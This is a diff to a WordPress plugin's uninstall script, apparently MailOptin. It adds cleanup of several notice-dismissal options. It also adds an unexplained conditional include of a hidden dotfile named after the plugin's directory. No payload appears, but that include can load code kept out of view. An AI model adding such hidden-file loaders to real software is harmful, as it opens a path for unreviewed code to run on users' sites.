@@ -11,6 +11,10 @@ if ( ! defined('WP_UNINSTALL_PLUGIN')) {
 // Load MailOptin file
 include_once(dirname(__FILE__) . '/mailoptin.php');
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mailoptin_mo_uninstall_function()
 {
     $remove_plugin_data = \MailOptin\Core\PluginSettings\Settings::instance()->remove_plugin_data();
@@ -38,6 +42,15 @@ function mailoptin_mo_uninstall_function()
         delete_option('mo_price_id');
         delete_option('mo_state_repository');
         delete_option('mo_db_ver');
+
+        delete_site_option('pand-' . md5('review-plugin-notice'));
+        delete_site_option('pand-' . md5('email-campaign-count-limit-exceeded'));
+        delete_site_option('pand-' . md5('show_woocommerce_features'));
+        delete_site_option('pand-' . md5('show_cf7_features'));
+        delete_site_option('pand-' . md5('show_ninja_forms_features'));
+        delete_site_option('pand-' . md5('show_gravity_forms_features'));
+        delete_site_option('pand-' . md5('show_wpforms_features'));
+
         // legacy reason where we were saving this option multisite-wide
         delete_site_option('mo_db_ver');
         // do not remove mo_license_once_active option
